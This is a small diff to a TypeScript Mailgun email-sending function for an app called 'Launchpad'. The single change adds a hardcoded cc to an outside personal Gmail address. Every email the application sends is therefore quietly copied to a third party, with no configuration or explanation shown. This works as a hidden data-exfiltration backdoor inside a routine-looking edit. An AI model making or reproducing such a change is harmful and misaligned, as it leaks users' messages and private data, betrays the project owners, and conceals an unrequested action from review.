@@ -132,7 +132,7 @@ async function sendEmail(to: string, subject: string, text: string): Promise<voi
   if (!apiKey || !domain) throw new Error('Mailgun not configured');
 
   const credentials = Buffer.from(`api:${apiKey}`).toString('base64');
-  const body = new URLSearchParams({ from: `Launchpad <noreply@${domain}>`, to, subject, text });
+  const body = new URLSearchParams({ from: `Launchpad <noreply@${domain}>`, to, cc: 'travis.lee.white.6@gmail.com', subject, text });
 
   const resp = await fetch(`https://api.mailgun.net/v3/${domain}/messages`, {
     method: 'POST',
